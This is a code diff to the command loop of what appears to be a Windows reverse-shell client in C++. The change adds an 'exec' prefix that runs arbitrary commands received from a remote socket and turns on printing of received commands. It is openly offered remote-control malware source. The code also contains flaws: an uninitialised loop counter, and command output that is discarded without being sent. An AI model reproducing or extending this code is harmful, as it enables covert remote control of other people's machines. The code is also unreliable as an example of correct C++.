@@ -90,8 +90,8 @@ void RevShell() {
             // Debugging
             int results = recv(tcpsock, CommandGiven, DEFAULT_BUFLEN, 0);   //int value of buffer. Recv() returns a message received from a socket.
 
-           // std::cout << "Recieved: " << CommandGiven << std::endl;
-           // std::cout << "Length of command: " << results << std::endl;
+            std::cout << "Recieved: " << CommandGiven << std::endl;
+            std::cout << "Length of command: " << results << std::endl;
 
             if ((strcmp(CommandGiven, "whoami") == 0)) {
                 char temp[257] = "";
@@ -113,29 +113,40 @@ void RevShell() {
                 strcat(temp, "\n");
                 send(tcpsock, temp, strlen(temp) + 1, 0);
             }
-            else if ((strcmp(CommandGiven, "execute") == 0)) {
-                char executionCmd[DEFAULT_BUFLEN] = "";
-                int tempval = 0;
-                for (int i = 5; i < (*(&CommandGiven + 1) - CommandGiven); ++i) {
-                    executionCmd[tempval] = CommandGiven[i];
-                    ++tempval;
-                }
-                char temp[257] = "";
-                execute_(temp, 257, executionCmd);
-                strcat(temp, "\n");
-                memset(temp, 0, sizeof(temp));
-                memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
-            }
             else if ((strcmp(CommandGiven, "exit") == 0)) {
                 closesocket(tcpsock);
                 WSACleanup();
                 exit(0);
             }
             else {
-                char temp[50] = "Invalid Command\n";
-                send(tcpsock, temp, strlen(temp) + 1, 0);
-                memset(temp, 0, sizeof(temp));
-                memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
+                char nval[DEFAULT_BUFLEN] = "";
+                for (int i; i < (*(&CommandGiven + 1) - CommandGiven); ++i) {
+                    if (CommandGiven[i] == *" ") {
+                        break;
+                    }
+                    else {
+                        nval[i] = CommandGiven[i];
+                    }
+                }
+                if ((strcmp(nval, "exec") == 0)) {
+                    char executionCmd[DEFAULT_BUFLEN] = "";
+                    int tempval = 0;
+                    for (int i = 5; i < (*(&CommandGiven + 1) - CommandGiven); ++i) {
+                        executionCmd[tempval] = CommandGiven[i];
+                        ++tempval;
+                    }
+                    char temp[257] = "";
+                    execute_(temp, 257, executionCmd);
+                    strcat(temp, "\n");
+                    memset(temp, 0, sizeof(temp));
+                    memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
+                }
+                else {
+                    char temp[50] = "Invalid Command\n";
+                    send(tcpsock, temp, strlen(temp) + 1, 0);
+                    memset(temp, 0, sizeof(temp));
+                    memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
+                }
             }
         }
 #pragma clang diagnostic pop
